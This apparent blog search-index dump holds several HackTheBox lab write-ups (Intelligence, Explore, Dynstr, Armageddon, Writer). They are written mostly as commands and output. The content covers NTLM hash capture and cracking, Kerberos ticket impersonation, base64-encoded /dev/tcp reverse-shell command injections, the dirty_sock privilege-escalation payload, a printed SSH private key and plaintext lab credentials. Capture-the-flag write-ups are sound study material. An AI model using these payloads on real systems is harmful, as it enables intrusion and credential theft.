C$ Disk Default share │ IPC$ IPC Remote IPC │ IT Disk │ NETLOGON Disk Logon server share │ SYSVOL Disk Logon server share │ Users Disk\nTiffany cannot access C$, ADMIN$. From Users folder, we can see there is another user named Ted.Graves, who doesn\u0026rsquo;t have the default password. In IT folder, there is a downdetector.ps1 script.\n9- Use crackmapexec to retrieve hashes from memory using \u0026ndash;sam. No success.\n10- Enumerate all services in AD by ldapsearch, this time with credentials: ldapsearch -h intelligence.htb -x -D \u0026ldquo;cn=Tiffany.Molina,cn=Users,dc=intelligence,dc=htb\u0026rdquo; -w NewIntelligenceCorpUser9876 servicePrincipalName. No success, invalid credentials.\n11- Read downdetector.ps1. It is the script that the Internal IT document mentioned. It is scheduled to run every 5 minutes. If there is a domain starting with \u0026lsquo;web\u0026rsquo;, send a request with default credentials, probably from Ted. Let\u0026rsquo;s trigger it by adding a DNS record starting with \u0026lsquo;web\u0026rsquo; and catch the default credentials of Ted.\nThis is downdetector.ps1.\n# Check web server status. Scheduled to run every 5min Import-Module ActiveDirectory foreach($record in Get-ChildItem \u0026#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\u0026#34; | Where-Object Name -like \u0026#34;web*\u0026#34;) { try { $request = Invoke-WebRequest -Uri \u0026#34;http://$($record.Name)\u0026#34; -UseDefaultCredentials if(.StatusCode -ne 200) { Send-MailMessage -From \u0026#39;Ted Graves \u0026lt;Ted.Graves@intelligence.htb\u0026gt;\u0026#39; -To \u0026#39;Ted Graves \u0026lt;Ted.Graves@intelligence.htb\u0026gt;\u0026#39; -Subject \u0026#34;Host: $($record.Name)is down\u0026#34; } } catch {} } And here we add a DNS record with Tiffany credentials.\npython3 dnstool.py -u \u0026#39;intelligence.htb\\Tiffany.Molina\u0026#39; -p \u0026#39;NewIntelligenceCorpUser9876\u0026#39; -a add -r \u0026#39;weboops.intelligence.htb\u0026#39; -d 10.10.14.93 10.10.10.248 (where 10.10.10.248 is the IP of the LDAP server) Listen for NTLM connection.\nresponder -I tun0 -A [HTTP] NTLMv2 Client : 10.10.10.248 [HTTP] NTLMv2 Username : intelligence\\Ted.Graves [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:cb633911f6b526fe:79E28A59A0F79CEE88340066FF707585:01010000000000002828DFB4C796D7018D1F70D25A187CCC0000000002000800360033003400590001001E00570049004E002D00470054004A004D004D0041004B0037004100370035000400140036003300340059002E004C004F00430041004C0003003400570049004E002D00470054004A004D004D0041004B0037004100370035002E0036003300340059002E004C004F00430041004C000500140036003300340059002E004C004F00430041004C00080030003000000000000000000000000020000029AFE7F9B78F25FB6B044D77DB5B680EAD8D7FBD6B72AE9E6CE76020298CB43C0A0010000000000000000000000000000000000009003A0048005400540050002F007700650062006F006F00700073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 12- Sadly we cannot convert NTLMv2 hash to NTLM hash to perform PtH attacks. What we can do is either NTLM relay or crack the hash.\nntlmrelayx # Haven\u0026#39;t read about ntlm relay internals. I need to study it.  hashcat -m 5600 ted_ntlmv2.txt /usr/share/wordlists/rockyou.txt -O # --\u0026gt; Mr.Teddy Where ted_ntlmv2.txt is\nTed.Graves::intelligence:cb633911f6b526fe:79E28A59A0F79CEE88340066FF707585:01010000000000002828DFB4C796D7018D1F70D25A187CCC0000000002000800360033003400590001001E00570049004E002D00470054004A004D004D0041004B0037004100370035000400140036003300340059002E004C004F00430041004C0003003400570049004E002D00470054004A004D004D0041004B0037004100370035002E0036003300340059002E004C004F00430041004C000500140036003300340059002E004C004F00430041004C00080030003000000000000000000000000020000029AFE7F9B78F25FB6B044D77DB5B680EAD8D7FBD6B72AE9E6CE76020298CB43C0A0010000000000000000000000000000000000009003A0048005400540050002F007700650062006F006F00700073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 13- Run bloodhound via winrm. WinRMAuthorizationError for both Ted and Tiffany. Try psexec.\nevil-winrm -e htb/machines/intelligence/privesc -i intelligence.htb -u \u0026#39;Tiffany.Molina\u0026#39; -p \u0026#39;NewIntelligenceCorpUser9876\u0026#39; psexec.py intelligence.htb/Ted.Graves@dc.intelligence.htb # Shares aren\u0026#39;t writable by Ted.  14- Use Ted and Tiffany creds to gMSADumper and lapsdumper in search for hashes. lapsdumper does not reveal anything (no permissions).\npython3 gMSADumper.py -u \u0026#39;Tiffany.Molina\u0026#39; -p \u0026#39;NewIntelligenceCorpUser9876\u0026#39; -d intelligence.htb python3 gMSADumper.py -u \u0026#39;Ted.Graves\u0026#39; -p \u0026#39;Mr.Teddy\u0026#39; -d intelligence.htb \u0026gt; DC$ \u0026gt; itsupport svc_int$:::5e47bac787e5e1970cf9acdb5b316239 15- Try to get the service ticket and perform Pass The Ticket (PTT) attack.\npython3 getST.py intelligence.htb/scv_int$ -spn WWW/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator [*] Getting TGT for user Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it\u0026rsquo;s because of your local time, you need to synchronise the host with the DC: ntpdate \u0026lt;IP of DC\u0026gt;\nntpdate intelligence.htb python3 getST.py intelligence.htb/scv_int$ -spn WWW/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator 16- Load the ccache ticket by setting the KRB5CCNAME environment variable to the ticket path. Then access SMB using the ticket.\nexport KRB5CCNAME=/path/to/administrator.ccache smbclient.py -k -no-pass -dc-ip intelligence.htb -target-ip intelligence.htb intelligence.htb/Administrator@dc.intelligence.htb \u0026gt; use C$ \u0026gt; cd Users/Administrator/Desktop \u0026gt; get root.txt OR mount C$??? But failed with STATUS_SHARING_VIOLATION. OR psexec.py\n psexec.py -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb\n root: 676a7f4d669819b40d5d8ef5aadb6f5c\n ", 
            "url": "\/labs\/intelligence\/"
        },
        
        
        
        "\/labs\/explore\/": {
            
            "title": "Explore - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: easy  Foothold 1- Nmap for all ports.\n# Nmap 7.91 scan initiated Tue Jul 20 07:48:06 2021 as: nmap -sC -sV -p- -oA nmap target Nmap scan report for target (10.10.10.247) Host is up (0.061s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 38595/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Tue, 20 Jul 2021 12:44:55 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Tue, 20 Jul 2021 12:44:55 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Tue, 20 Jul 2021 12:45:00 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Help: | HTTP/1.0 400 Bad Request | Date: Tue, 20 Jul 2021 12:45:16 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Tue, 20 Jul 2021 12:45:00 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 20 Jul 2021 12:45:16 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???`~? | ??{????w????\u0026lt;=?o? | TLSSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 20 Jul 2021 12:45:16 GMT | Content-Length: 71 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ??random1random2random3random4 | TerminalServerCookie: | HTTP/1.0 400 Bad Request | Date: Tue, 20 Jul 2021 12:45:16 GMT | Content-Length: 54 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ Cookie: mstshash=nmap 42135/tcp open http ES File Explorer Name Response httpd |_http-title: Site doesn't have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn't have a title (text/plain). 2- ES File explorer metasploit exploit auxiliary/scanner/http/es_file\u0026hellip; to get pictures and look for creds.\n3- The creds in creds.jpg is probably the creds for ssh tcp/2222.\n username: kristi password: Kr1sT!5h@Rp3xPl0r3! Privilege escalation 4- tcp 5555 freeciv exploit. Android Debug Bridge freeciv exploit. This is a python script which is basically the solution: ssh local port forwarding: connect to remote 5555 via 2222 ssh link.\nimport socket # socket import subprocess # Subprocess import pyautogui # PyAutoGui import time # Time def connection_function(host, port): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) print(s.recv(1024)) connection_function(\u0026#34;10.10.10.247\u0026#34;, 2222) def adb_connection(host, port): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) print(s.recv(1024)) subprocess.call([\u0026#39;ssh -p 2222 -L 5555:localhost:5555 kristi@target\u0026#39;], shell=True) password = \u0026#34;Kr1sT!5h@Rp3xPl0r3!\u0026#34; # this isn\u0026#39;t used though print(s.recv(1024)) adb_connection(\u0026#34;10.10.10.247\u0026#34;, 2222) ", 
            "url": "\/labs\/explore\/"
        },
        
        
        
        "\/labs\/dynstr\/": {
            
            "title": "Dynstr - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: medium  Part of this article is encrypted with password:\n  --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap discovered ports 22, 80, 53.\n80 -\u0026gt; Apache/2.4.41 53 -\u0026gt; ISC BIND 9.16.1\n# Nmap 7.91 scan initiated Wed Sep 1 19:36:11 2021 as: nmap -sC -sV -p- -v -oA tcp dynstr.htb Nmap scan report for dynstr.htb (10.10.10.244) Host is up (0.090s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA) | 256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA) |_ 256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519) 53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.16.1-Ubuntu 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Dyna DNS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Sep 1 19:41:49 2021 -- 1 IP address (1 host up) scanned in 337.88 seconds 2- Web recon. \u0026ndash;\u0026gt; The company Dyna offers dynamic DNS services just as no-ip.com API \u0026ndash;\u0026gt; It has domains: dnsalias.htb, dynamicdns.htb, no-ip.htb \u0026ndash;\u0026gt; credentials: dynadns:sndanyd \u0026ndash;\u0026gt; email: dns@dyna.htb\nI\u0026rsquo;ll add dyna.htb to /etc/hosts.\nFuzz in the background.\nffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dyna.htb/FUZZ -fc 403 Found /nic.\n3- DNS zone transfer failed.\ndig axfr @dynstr.htb dig axfr @dynstr.htb dnsalias.htb # --\u0026gt; Transfer failed.  Try playing with DNS with nslookup and query the 3 found domains: no answer. Try dig.\n dig ANY @dynstr.htb dnsalias.htb dnsalias.htb. 60 IN SOA dns1.dyna.htb. hostmaster.dyna.htb. 2021030300 21600 3600 604800 60 dnsalias.htb. 60 IN NS dns1.dyna.htb. dig ANY @dynstr.htb no-ip.htb Same answer. dig ANY @dynstr.htb dynamicdns.htb Same answer.\n hostmaster@dyna.htb is the DNS admin email. dns1.dyna.htb points to 127.0.0.1. This is a dead end.\n4- Remember the no-ip.com API and the credentials from the web recon phase? I googled about the no-ip.com API. The first page gives an example of the update API:\nhttp://username:password@dynupdate.no-ip.com/nic/update?hostname=mytest.example.com\u0026amp;myip=192.0.2.25 GET /nic/update?hostname=mytest.example.com\u0026amp;myip=192.0.2.25 HTTP/1.1 Host: dynupdate.no-ip.com Authorization: Basic base64-encoded-auth-string User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com Where the auth string is base64 encoded username:password.\nFuzz this API and look for command injection (sql injection is unlikely).\nUse Burpsuite to do manual fuzzing first:\nGET /nic/update?hostname=%3bdynamicdns.no-ip.htb\u0026amp;myip=192.0.2.25 HTTP/1.1 # \u0026lt;--- Here I used dynamicdns.no-ip.htb because single domains give 911 wrong domain error, I used %3b because that\u0026#39;s \u0026#34;;\u0026#34; Authorization: Basic ZHluYWRuczpzbmRhbnlk returns 911 [nsupdate failed].\n5- Research nsupdate to get a feeling of how the command call is made. Urlencode this and send it to burpsuite repeater:\nhostname=`echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE= | base64 -d | bash` anything.no-ip.htb while listening to 4242.\nwhoami # www-data cat /etc/passwd # There are users bindmgr and dyna.  6- List /home/dyna and /home/bindmgr. There is a setuid bash with owner bindmgr, just run bash with euid:\n./bash -p cat user.txt It turns out the setuid bash is a leftover of other players. Read step 7 first. The correct way is to use nsupdate to point some DNS record to our IP and then ssh with private key.\nnsupdate -k infra.key \u0026gt; update add sftp.infra.dyna.htb 86400 A ATTACKER_IP \u0026gt; update add REVERSED_ATTACKER_IP.in-addr.arpa 300 PTR anything.infra.dyna.htb \u0026gt; send ssh -i bindmgr bindmgr@dynstr.htb And we get user.txt.\nPrivilege escalation 7- Inspect /home/bindmgr and find (amidst a lot of garbage):\ncurl -sk sftp://bindmgr@sftp.infra.dyna.htb/bindmgr-release.zip as well as the private key for bindmgr in a file whose name starts with strace. Note down the domain sftp.infra.dyna.htb.\n-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1 42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3 HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk +JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs 4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5 rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ== -----END OPENSSH PRIVATE KEY----- However,\nssh -i bindmgr bindmgr@dyna.htb SSH with private key still requires a password\u0026hellip; See previous step for intended path.\n8- As bindmgr, sudo -l. It can execute bindmgr.sh as root.\n#!/usr/bin/bash  # This script generates named.conf.bindmgr to workaround the problem # that bind/named can only include single files but no directories. # # It creates a named.conf.bindmgr file in /etc/bind that can be included # from named.conf.local (or others) and will include all files from the # directory /etc/bin/named.bindmgr. # # NOTE: The script is work in progress. For now bind is not including # named.conf.bindmgr.  # # TODO: Currently the script is only adding files to the directory but # not deleting them. As we generate the list of files to be included # from the source directory they won\u0026#39;t be included anyway. BINDMGR_CONF=/etc/bind/named.conf.bindmgr BINDMGR_DIR=/etc/bind/named.bindmgr indent() { sed \u0026#39;s/^/ /\u0026#39;; } # Check versioning (.version) echo \u0026#34;[+] Running $0to stage new configuration from $PWD.\u0026#34; if [[ ! -f .version ]] ; then echo \u0026#34;[-] ERROR: Check versioning. Exiting.\u0026#34; exit 42 fi if [[ \u0026#34;`cat .version 2\u0026gt;/dev/null`\u0026#34; -le \u0026#34;`cat $BINDMGR_DIR/.version 2\u0026gt;/dev/null`\u0026#34; ]] ; then echo \u0026#34;[-] ERROR: Check versioning. Exiting.\u0026#34; exit 43 fi # Create config file that includes all files from named.bindmgr. echo \u0026#34;[+] Creating $BINDMGR_CONFfile.\u0026#34; printf \u0026#39;// Automatically generated file. Do not modify manually.\\n\u0026#39; \u0026gt; $BINDMGR_CONF for file in * ; do printf \u0026#39;include \u0026#34;/etc/bind/named.bindmgr/%s\u0026#34;;\\n\u0026#39; \u0026#34;$file\u0026#34; \u0026gt;\u0026gt; $BINDMGR_CONF done # Stage new version of configuration files. echo \u0026#34;[+] Staging files to $BINDMGR_DIR.\u0026#34; cp .version * /etc/bind/named.bindmgr/ # Check generated configuration with named-checkconf. echo \u0026#34;[+] Checking staged configuration.\u0026#34; named-checkconf $BINDMGR_CONF \u0026gt;/dev/null if [[ $? -ne 0 ]] ; then echo \u0026#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: \u0026#34; named-checkconf $BINDMGR_CONF 2\u0026gt;\u0026amp;1 | indent exit 44 else echo \u0026#34;[+] Configuration successfully staged.\u0026#34; # *** TODO *** Uncomment restart once we are live. # systemctl restart bind9 if [[ $? -ne 0 ]] ; then echo \u0026#34;[-] Restart of bind9 via systemctl failed. Please check logfile: \u0026#34; systemctl status bind9 else echo \u0026#34;[+] Restart of bind9 via systemctl succeeded.\u0026#34; fi fi 9- .version and a wildcard are copied to /etc/bind/named.bindmgr/. The script first checks that in the current directory there is a .version file and that the number in it is greater equal than $BINDMGR_DIR/.version. So we create a .version file in /tmp and create a bash and --preserve=mode files.\ncd /tmp cp /bin/bash . chmod u+s bash echo \u0026#34;\u0026#34; \u0026gt; \u0026#34;--preserve=mode\u0026#34; cp $BINDMGR_DIR/.version .version # run the script as sudo sudo bindmgr.sh 10- The files are copied to /etc/bind/named.bindmgr/. The bash setuid bit is set and it\u0026rsquo;s owned by root.\ncd /etc/bind/named.bindmgr/ bash -p root.txt: c2ba74897b445b0e30466fa9d7b26253\n ", 
            "url": "\/labs\/dynstr\/"
        },
        
        
        
        "\/labs\/armageddon\/": {
            
            "title": "Armageddon - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: easy  Foothold 1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).\n# Nmap 7.91 scan initiated Sat Jul 3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.062s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D |_http-generator: Drupal 7 (http://drupal.org) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Welcome to Armageddon | Armageddon Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 3 12:39:22 2021 -- 1 IP address (1 host up) scanned in 27.95 seconds 2- Use metasploit and search for drupalgeddon. Exploit right away.\n3- Look at config files. In /var/www/html/sites/default/settings.php\u0026hellip;\n$databases = array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;database\u0026#39; =\u0026gt; \u0026#39;drupal\u0026#39;, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;drupaluser\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;CQHEy@9M*m23gBVj\u0026#39;, \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;port\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;driver\u0026#39; =\u0026gt; \u0026#39;mysql\u0026#39;, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ), ), ); 4- Look at the database.\nmysql -u drupaluser -D drupal -p -e \u0026#39;select name,pass,mail from users;\u0026#39; Enter password: CQHEy@9M*m23gBVj name\tpass\tmail brucetherealadmin\t$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt\tadmin@armageddon.eu 5- Crack the hash.\njohn -w /usr/share/wordlists/rockyou.txt --format=Drupal7 admin_hash.txt brucetherealadmin:booboo Privilege escalation 6- sudo -l reveals snapd can be sudoed by brucetherealadmin. A privesc exploit for snapd is dirty_sock.\npython2 -c \u0026#39;print \u0026#34;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw\u0026#34; + \u0026#34;A\u0026#34;*4256 + \u0026#34;==\u0026#34;\u0026#39; | base64 -d \u0026gt; leet.snap sudo snap install --devmode leet.snap su dirty_sock # password dirty_sock, it has (ALL):ALL:ALL privileges.  sudo su  dirty_sock exploit base64 decoded:\nhsqs!V\\�������������\u0026gt;x#!/bin/bash useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash usermod -aG sudo dirty_sock echo \u0026quot;dirty_sock ALL=(ALL:ALL) ALL\u0026quot; \u0026gt;\u0026gt; /etc/sudoers name: dirty-sock version: '0.1' summary: Empty snap, used for exploit description: 'See https://github.com/initstring/dirty_sock ' architectures: - amd64 confinement: devmode grade: devel ��7zXZi\u0026quot;�6�d�!:)ȉ��\\]��Z���ꮚ�E��9\u0026gt;�Y���`dQ�R����d詯qj|��٩n��^5��I]u�#�Jq�A�uK9��Uy������YZ��7zXZi\u0026quot;�6�S�!�����K]j;n��Q�b3ʶ]I-�,����Hʭ�E��k�\t$l5K�(�y���\t_ͼӡ�h�D��u �'�yE�YZ8��\u0026lt;\\���\u0026gt;��base64: invalid input ", 
            "url": "\/labs\/armageddon\/"
        },
        
        
        
        "\/labs\/writer\/": {
            
            "title": "Writer - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: medium  Part of this article is encrypted with password:\n  --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap found 80 (http), 139, 445 (SMB), 22 (ssh)\n2- Web discovery potential exploits:\n Uses php, contact page validate.js accesses contact.php but it returns 404??? Subdomain fuzzing? wfuzz -c -u \u0026ldquo;http://writer.htb/\u0026quot; -H \u0026ldquo;Host:FUZZ.writer.htb\u0026rdquo; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \u0026ndash;hl=318 -\u0026gt; None Path fuzzing: wfuzz -c -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -u http://writer.htb/FUZZ Found dashboard, administrative.  3- SMB scanning?\nenum4linux -a writer.htb \u0026gt; smb_enum.txt # https://book.hacktricks.xyz/pentesting/pentesting-smb Intel:\n Usernames: john, kyle (Kyle Travis) Domains: WRITER, Builtin WRITER/kyle  With blank username and password we CANNOT access IPC or writer2_projects shares.\n4- Dashboard from Burpsuite is not interesting. See administrative \u0026ndash;\u0026gt; login form.\n5- Try weak credentials. No luck. Try SQLi uname=admin;\u0026ndash;+ to access dashboard and edit stories. Try sqlmap -\u0026gt; None.\n6- Image filename execution (command injection). touch \u0026lsquo;1.jpg; echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvOTAwMSAwPiYxIg==| base64 -d | bash;\u0026rsquo; Attach file 1.jpg. Catch Burpsuite packet and in \u0026ldquo;image-url\u0026rdquo; add:\nfile:///var/www/writer.htb/writer/static/img/1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvOTAwMSAwPiYxIg==| base64 -d | bash`;# Listen for reverse shell:\nnc -lvnp 9001 